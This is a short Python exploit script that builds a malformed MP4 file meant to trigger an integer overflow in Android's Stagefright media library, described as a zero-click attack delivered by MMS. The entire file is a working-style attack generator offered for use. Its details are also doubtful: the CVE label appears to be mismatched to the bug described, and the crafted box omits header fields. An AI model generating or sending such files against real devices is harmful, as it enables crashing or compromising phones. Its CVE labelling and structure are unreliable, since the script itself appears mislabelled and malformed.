#!/usr/bin/env python3
"""CVE-2015-6602 — Stagefright (libstagefright). Integer overflow in
SampleTable::setTimeToSampleParams on a crafted MP4. Zero-click via MMS.
Public PoC. Confidence: HIGH (classic, widely reproduced)."""
import struct, sys
from pathlib import Path

def _box(t, body): return struct.pack(">I", 8 + len(body)) + t + body

def build() -> bytes:
    ftyp = _box(b"ftyp", b"mp42\x00\x00\x00\x00mp42isom")
    # stts with count=0xFFFFFFFF but only one entry -> overflow
    stts = _box(b"stts", struct.pack(">I", 0xFFFFFFFF) + struct.pack(">II", 1, 1))
    stbl = _box(b"stbl", stts)
    moov = _box(b"moov", _box(b"trak", _box(b"mdia", _box(b"minf", stbl))))
    return ftyp + moov + _box(b"mdat", b"\x00" * 32)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2015-6602.mp4")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2015-6602 MP4 -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
